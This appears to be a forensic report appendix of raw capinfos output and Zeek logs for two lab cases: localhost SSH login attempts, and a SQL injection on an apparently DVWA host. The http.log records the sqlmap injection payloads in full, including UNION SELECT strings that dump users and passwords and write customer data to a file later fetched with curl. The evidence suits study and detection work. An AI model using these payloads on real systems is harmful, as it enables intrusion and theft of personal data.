# Appendix A — Raw evidence preserved (verbatim excerpts)

Full raw outputs are preserved under `cases/*/tshark/`, `cases/*/tcpdump/` and `cases/*/zeek/{tsv,json}/`. The blocks below are verbatim `head -n 28` / `tail -n 12` excerpts and complete `capinfos` outputs.

## case01_ssh_sessions

### capinfos
```
File name:           case01.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 262144 bytes
Number of packets:   107
File size:           19 kB
Data size:           17 kB
Capture duration:    34.385135 seconds
Earliest packet time: 2026-11-16 16:20:54.608130
Latest packet time:   2026-11-16 16:21:28.993265
Data byte rate:      506 bytes/s
Data bit rate:       4,051 bits/s
Average packet size: 162.75 bytes
Average packet rate: 3 packets/s
SHA256:              771e90d78db4d11cfda58d345b490f612986c06c4e72627252f2c916de280c99
SHA1:                cc36230db2495436e276617aa74d7b35bf956250
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 262144
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 107
```

### zeek/tsv/conn.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-29-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1794846054.608130	CF3dQ73otQFUMGzMMi	127.0.0.1	34416	127.0.0.1	22	tcp	ssh	0.120797	1227	1741	SF	T	T	0	ShADadFf	13	1911	12	2373	-	6
1794846054.939960	CPbK9Z6ezH8vbIQn1	127.0.0.1	34430	127.0.0.1	22	tcp	ssh	19.858788	1679	2077	SF	T	T	0	ShADadFf	18	2623	24	3333	-	6
1794846074.796806	CIkYPK3CLHxdbW23vh	127.0.0.1	54844	127.0.0.1	22	tcp	ssh	14.196392	1603	1977	SF	T	T	0	ShADadFf	17	2495	23	3181	-	6
#close	2026-11-18-19-29-59
```

### zeek/tsv/conn.log — tail -n 12
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-29-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1794846054.608130	CF3dQ73otQFUMGzMMi	127.0.0.1	34416	127.0.0.1	22	tcp	ssh	0.120797	1227	1741	SF	T	T	0	ShADadFf	13	1911	12	2373	-	6
1794846054.939960	CPbK9Z6ezH8vbIQn1	127.0.0.1	34430	127.0.0.1	22	tcp	ssh	19.858788	1679	2077	SF	T	T	0	ShADadFf	18	2623	24	3333	-	6
1794846074.796806	CIkYPK3CLHxdbW23vh	127.0.0.1	54844	127.0.0.1	22	tcp	ssh	14.196392	1603	1977	SF	T	T	0	ShADadFf	17	2495	23	3181	-	6
#close	2026-11-18-19-29-59
```

### zeek/tsv/ssh.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	ssh
#open	2026-11-18-19-29-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	version	auth_success	auth_attempts	direction	client	server	cipher_alg	mac_alg	compression_alg	kex_alg	host_key_alg	host_key_fingerprint	remote_location.country_code	remote_location.region	remote_location.city	remote_location.latitude	remote_location.longitude
#types	time	string	addr	port	addr	port	count	bool	count	enum	string	string	string	string	string	string	string	string	string	string	string	double	double
1794846054.608280	CF3dQ73otQFUMGzMMi	127.0.0.1	34416	127.0.0.1	22	2	-	0	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
1794846054.940122	CPbK9Z6ezH8vbIQn1	127.0.0.1	34430	127.0.0.1	22	2	F	5	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
1794846074.796943	CIkYPK3CLHxdbW23vh	127.0.0.1	54844	127.0.0.1	22	2	T	5	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
#close	2026-11-18-19-29-59
```

### zeek/tsv/ssh.log — tail -n 12
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	ssh
#open	2026-11-18-19-29-59
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	version	auth_success	auth_attempts	direction	client	server	cipher_alg	mac_alg	compression_alg	kex_alg	host_key_alg	host_key_fingerprint	remote_location.country_code	remote_location.region	remote_location.city	remote_location.latitude	remote_location.longitude
#types	time	string	addr	port	addr	port	count	bool	count	enum	string	string	string	string	string	string	string	string	string	string	string	double	double
1794846054.608280	CF3dQ73otQFUMGzMMi	127.0.0.1	34416	127.0.0.1	22	2	-	0	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
1794846054.940122	CPbK9Z6ezH8vbIQn1	127.0.0.1	34430	127.0.0.1	22	2	F	5	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
1794846074.796943	CIkYPK3CLHxdbW23vh	127.0.0.1	54844	127.0.0.1	22	2	T	5	-	SSH-2.0-libssh_0.12.2	SSH-2.0-OpenSSH_10.6p1 Debian-1	chacha20-poly1305@openssh.com	hmac-sha2-256-etm@openssh.com	none	curve25519-sha256	ssh-ed25519	SHA256:PbNXM+lCFYUC63syQQKCFpRKNv2c/jrn	-	-	-	-	-
#close	2026-11-18-19-29-59
```


## case02_web_sqli

### capinfos
```
File name:           cases/case02_web_sqli/raw/case02.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   203
File size:           111 kB
Data size:           108 kB
Capture duration:    132.889504 seconds
Earliest packet time: 2026-11-03 13:20:00.000000
Latest packet time:   2026-11-03 13:22:12.889504
Data byte rate:      814 bytes/s
Data bit rate:       6,519 bits/s
Average packet size: 533.50 bytes
Average packet rate: 1 packets/s
SHA256:              e7980e5a135355fe2535a7df9bebb7dfbf73805edafd51a011a3e0fa3d5823c9
SHA1:                7f8381226d9c5400a74a05a8d549ccb1c13ec7c2
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 65535
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 203
```

### zeek/tsv/conn.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-06-18
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1793712000.000000	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	tcp	http	10.127434	1200	16867	SF	T	T	0	ShADadFf	22	2080	21	17707	-	6
1793712095.000000	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	tcp	http	7.074153	3305	47176	SF	T	T	0	ShADadFf	55	5505	54	49336	-	6
1793712132.074353	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	tcp	http	0.814951	184	28607	SF	T	T	0	ShADadFf	26	1224	25	29607	-	6
#close	2026-11-18-19-06-18
```

### zeek/tsv/conn.log — tail -n 12
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	conn
#open	2026-11-18-19-06-18
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents	ip_proto
#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]	count
1793712000.000000	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	tcp	http	10.127434	1200	16867	SF	T	T	0	ShADadFf	22	2080	21	17707	-	6
1793712095.000000	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	tcp	http	7.074153	3305	47176	SF	T	T	0	ShADadFf	55	5505	54	49336	-	6
1793712132.074353	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	tcp	http	0.814951	184	28607	SF	T	T	0	ShADadFf	26	1224	25	29607	-	6
#close	2026-11-18-19-06-18
```

### zeek/tsv/http.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	http
#open	2026-11-18-19-06-18
#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
1793712001.000440	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	1	GET	192.168.56.30	/login.php	-	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0	-	0	3927	200	OK	-	-	(empty)	-	-	-	-	-	-	FgWTGL1xYAa4B5ZMP1	-	text/html
1793712004.205739	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	2	POST	192.168.56.30	/login.php	-	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0	-	44	0	302	Found	-	-	(empty)	-	-	-	FoFeOG2awvlcf45Sfe	-	text/plain	-	-	-
1793712004.610139	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	3	GET	192.168.56.30	/index.php	-	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0	-	0	3927	200	OK	-	-	(empty)	-	-	-	-	-	-	F3XOhO3FRSJHtdYt08	-	text/html
1793712007.115437	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	4	GET	192.168.56.30	/vulnerabilities/sqli/	-	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0	-	0	3923	200	OK	-	-	(empty)	-	-	-	-	-	-	Fwp5K713qUB8bdM3Fd	-	text/html
1793712010.120735	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	5	GET	192.168.56.30	/vulnerabilities/sqli/?id=1&Submit=Submit	-	1.1	Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0	-	0	3954	200	OK	-	-	(empty)	-	-	-	-	-	-	FhOqJJxxtiQ3LHIm6	-	text/html
1793712095.455818	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	1	GET	192.168.56.30	/vulnerabilities/sqli/?id=1'&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4095	200	OK	-	-	(empty)	-	-	-	-	-	-	FnJo3XFLuou09AJ1g	-	text/html
1793712096.085563	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	2	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4159	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FZyo4o2H2tKBY2CVTa	-	text/html
1793712096.655166	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	3	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 1-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	(empty)	-	-	-	-	-	-	FmLLfVjmbIsqxuQmb	-	text/html
1793712097.379387	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	4	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 2-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	(empty)	-	-	-	-	-	-	FHAgwF4vSfrWpw5Flb	-	text/html
1793712098.240845	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	5	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 3-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3979	200	OK	-	-	(empty)	-	-	-	-	-	-	FCUgIA1jOKbgyMIkp4	-	text/html
1793712098.726260	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	6	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4016	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	Fqze8CUxjpsGuOSba	-	text/html
1793712099.342399	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	7	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT user(),database()-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4031	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FLhtXu34odFEvD2oB6	-	text/html
1793712100.199508	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	8	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4121	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FtLdJN1GoJmVSvcsNa	-	text/html
1793712100.611760	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	9	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='customers'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4241	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	F0mkvx4bYDZdfTdooe	-	text/html
1793712101.321747	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	10	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4345	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FXFDlh49H6I2dBkXYd	-	text/html
1793712102.067454	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	11	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT id,CONCAT_WS(',',first_name,last_name,email,phone,card_last4) FROM customers INTO OUTFILE '/var/www/html/dump/customers.csv'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FDAy1P2bz2gXESlpec	-	text/html
1793712132.874793	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	1	GET	192.168.56.30	/dump/customers.csv	-	1.1	curl/8.5.0	-	0	28370	200	OK	-	-	(empty)	-	-	-	-	-	-	FkBLUu28jFlfXZkM2d	-	text/plain
#close	2026-11-18-19-06-18
```

### zeek/tsv/http.log — tail -n 12
```
1793712096.085563	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	2	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4159	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FZyo4o2H2tKBY2CVTa	-	text/html
1793712096.655166	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	3	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 1-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	(empty)	-	-	-	-	-	-	FmLLfVjmbIsqxuQmb	-	text/html
1793712097.379387	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	4	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 2-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	(empty)	-	-	-	-	-	-	FHAgwF4vSfrWpw5Flb	-	text/html
1793712098.240845	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	5	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' ORDER BY 3-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3979	200	OK	-	-	(empty)	-	-	-	-	-	-	FCUgIA1jOKbgyMIkp4	-	text/html
1793712098.726260	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	6	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT 1,2-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4016	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	Fqze8CUxjpsGuOSba	-	text/html
1793712099.342399	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	7	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT user(),database()-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4031	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FLhtXu34odFEvD2oB6	-	text/html
1793712100.199508	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	8	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4121	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FtLdJN1GoJmVSvcsNa	-	text/html
1793712100.611760	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	9	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='customers'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4241	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	F0mkvx4bYDZdfTdooe	-	text/html
1793712101.321747	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	10	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	4345	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FXFDlh49H6I2dBkXYd	-	text/html
1793712102.067454	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	11	GET	192.168.56.30	/vulnerabilities/sqli/?id=1' UNION SELECT id,CONCAT_WS(',',first_name,last_name,email,phone,card_last4) FROM customers INTO OUTFILE '/var/www/html/dump/customers.csv'-- -&Submit=Submit	-	1.1	sqlmap/1.7.11#stable (https://sqlmap.org)	-	0	3978	200	OK	-	-	HTTP::URI_SQLI	-	-	-	-	-	-	FDAy1P2bz2gXESlpec	-	text/html
1793712132.874793	CnB1el1JM6p40XxRT2	192.168.56.10	52140	192.168.56.30	80	1	GET	192.168.56.30	/dump/customers.csv	-	1.1	curl/8.5.0	-	0	28370	200	OK	-	-	(empty)	-	-	-	-	-	-	FkBLUu28jFlfXZkM2d	-	text/plain
#close	2026-11-18-19-06-18
```

### zeek/tsv/files.log — head -n 28
```
#separator \x09
#set_separator	,
#empty_field	(empty)
#unset_field	-
#path	files
#open	2026-11-18-19-06-18
#fields	ts	fuid	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	source	depth	analyzers	mime_type	filename	duration	local_orig	is_orig	seen_bytes	total_bytes	missing_bytes	overflow_bytes	timedout	parent_fuid	md5	sha1	sha256	extracted	extracted_cutoff	extracted_size
#types	time	string	string	addr	port	addr	port	string	count	set[string]	string	string	interval	bool	bool	count	count	count	count	bool	string	string	string	string	string	bool	count
1793712001.004738	FgWTGL1xYAa4B5ZMP1	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3927	3927	0	0	F	-	b7d3b945b65fb7deb00cdfd6351fbedd	ba22d5c3e847784cafd150e127b774c54327cd5f	c9c6af25e6f91fb2275a82dd87012de6f6cde6afe8f06276dd2e74c9d47f7b2c	extract-1793712001.004738-HTTP-FgWTGL1xYAa4B5ZMP1	F	-
1793712004.205739	FoFeOG2awvlcf45Sfe	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/plain	-	0.000000	T	T	44	44	0	0	F	-	23856f0b00433ba86fb3350a4527ca84	0fa247f82c2717f5b97d64b84e4644bfe0632cf4	377c2ec158b833e14a6f6fdf1948471d294f4ebf44bfc4dd2d8be6af8bcd27cb	extract-1793712004.205739-HTTP-FoFeOG2awvlcf45Sfe	F	-
1793712004.614437	F3XOhO3FRSJHtdYt08	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3927	3927	0	0	F	-	e2598e8e81c0ecfa99d9c012f6aa502f	cd1e5be36205a1602ae5fc5723fcdd4fdd496528	39eaaa1c94675a823e4e5aca21cde50e3fe221e26dfa35ab5b3b3b9293f3339f	extract-1793712004.614437-HTTP-F3XOhO3FRSJHtdYt08	F	-
1793712007.119735	Fwp5K713qUB8bdM3Fd	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3923	3923	0	0	F	-	ef19c9725537018ad2e774e57804742e	a29a479bb296f00e01beca3cfd3041e35b3050a1	807b9fe8a06c177c3f1d68cfa8bc1032f807ef81312c49185d38f2f9d8e398e6	extract-1793712007.119735-HTTP-Fwp5K713qUB8bdM3Fd	F	-
1793712010.125034	FhOqJJxxtiQ3LHIm6	CwlHbz4y58dlmi1oYc	192.168.56.10	52110	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3954	3954	0	0	F	-	3b1c4808a32d78a42d54b2088e42b2ef	5abb6a910a484e6614f683fa683cdc81909df627	7366845e4da05667ba670aa1404331539a8ac2d3d49f4ace2555713f2adce2dd	extract-1793712010.125034-HTTP-FhOqJJxxtiQ3LHIm6	F	-
1793712095.460121	FnJo3XFLuou09AJ1g	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4095	4095	0	0	F	-	6206fd0e3271b33206de11c8f425fd84	63f3d9aeca266351d67891b5eced7f12f69f91b7	97d83d863f2275aa415be7eb12309541f8b72ce1db5486c889f049d075dfcf0b	extract-1793712095.460121-HTTP-FnJo3XFLuou09AJ1g	F	-
1793712096.089867	FZyo4o2H2tKBY2CVTa	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4159	4159	0	0	F	-	800e491ad5446c74c7379c7182cdb725	71b1764ed5f98aebe6ed2c173b2c5ccc35737f92	0e446b8a766e59cb1bbf3bdc3c03cbf3301b93460e9988d3083ebaab7c8bef87	extract-1793712096.089867-HTTP-FZyo4o2H2tKBY2CVTa	F	-
1793712096.659466	FmLLfVjmbIsqxuQmb	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712096.659466-HTTP-FmLLfVjmbIsqxuQmb	F	-
1793712097.383686	FHAgwF4vSfrWpw5Flb	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3978	3978	0	0	F	-	d6da1f0f9be1b5d1ebaf59efa33d5ff5	156ef0c0e6e3b3bf7768360f6d2ea28ab858ccf7	a091ee716b25509f1125b0c7a7f0d5d04c7860a0be6fb1d00ed8b8d10bd90df5	extract-1793712097.383686-HTTP-FHAgwF4vSfrWpw5Flb	F	-
1793712098.245145	FCUgIA1jOKbgyMIkp4	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.000800	T	F	3979	3979	0	0	F	-	3ae9d476e5db185635329af27f337e41	34b44852a280ce5a94fbfef8a9d7c6ea0e290a59	02b1f9d7940e418eee59ceb9c8194a4c474954f5a8f71e2f69c23ba80c4d9574	extract-1793712098.245145-HTTP-FCUgIA1jOKbgyMIkp4	F	-
1793712098.730560	Fqze8CUxjpsGuOSba	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001201	T	F	4016	4016	0	0	F	-	d6cdb2bdd694f8171b02c5e95d76a3f8	8e59fe74e025d979b1fe1d1c0627211707e1f71b	cea510f780d2dcc887ea4d95dc418972e7ffc1f93cea1d4ff90a6c93764ab04c	extract-1793712098.73056-HTTP-Fqze8CUxjpsGuOSba	F	-
1793712099.346700	FLhtXu34odFEvD2oB6	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4031	4031	0	0	F	-	9ed6006de6bac31705fcf6a9f4d8161a	628d0ad4f7fb6982613fc4fe8d09b6038bd386ba	6c944a25d503c0c1ebe0ae96426b721e1fd0e87290a93967d6067e61e8de4df7	extract-1793712099.3467-HTTP-FLhtXu34odFEvD2oB6	F	-
1793712100.203811	FtLdJN1GoJmVSvcsNa	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001201	T	F	4121	4121	0	0	F	-	1db05c65e6a3916cf96f29640ae21ce5	9506d84b197eacf094fa7a9987479edf293d5fca	bb871f3af9fbde982c4d4cbe9550254aa4c13d18647b890c7a5cc754c3b882d0	extract-1793712100.203811-HTTP-FtLdJN1GoJmVSvcsNa	F	-
1793712100.616066	F0mkvx4bYDZdfTdooe	CY729Y2IRo89aYI1	192.168.56.10	52112	192.168.56.30	80	HTTP	0	EXTRACT,SHA256,SHA1,MD5	text/html	-	0.001200	T	F	4241	4241	0	0	F	-	7e671c16c2340f970979a9668a655e38	1f279e3982a56dfc2989b7a4bf0b014f2122fb5f	4d54cf64ea2cb888e995481d7091d6b4c31d4f64777c2437462920930a00d010	extract-1793712100.616066-HTTP-F0mkvx4bYDZdfTdooe	F	-
